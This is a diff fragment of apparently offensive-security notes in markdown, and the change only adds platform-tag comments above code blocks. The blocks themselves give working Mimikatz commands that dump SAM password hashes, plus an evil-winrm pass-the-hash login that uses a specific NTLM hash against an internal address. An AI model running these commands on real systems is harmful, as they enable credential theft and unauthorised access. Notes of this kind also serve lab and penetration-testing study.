@@ -20,12 +20,14 @@ With local administrator rights, Mimikatz can dump local SAM hashes. If a passwo
 
 Launch Mimikatz from an RDP shared drive:
 
+<!-- cmd: windows -->
 ```cmd
 \\tsclient\share\mimikatz\x64\mimikatz.exe
 ```
 
 Enable debug, elevate, and log output:
 
+<!-- cmd: windows -->
 ```cmd
 privilege::debug
 token::elevate
@@ -34,12 +36,14 @@ log c:\windows\temp\mimikatz.log
 
 Dump SAM hashes:
 
+<!-- cmd: windows -->
 ```cmd
 lsadump::sam
 ```
 
 Reuse the NTLM hash:
 
+<!-- cmd: linux -->
 ```bash
 proxychains evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150
 ```
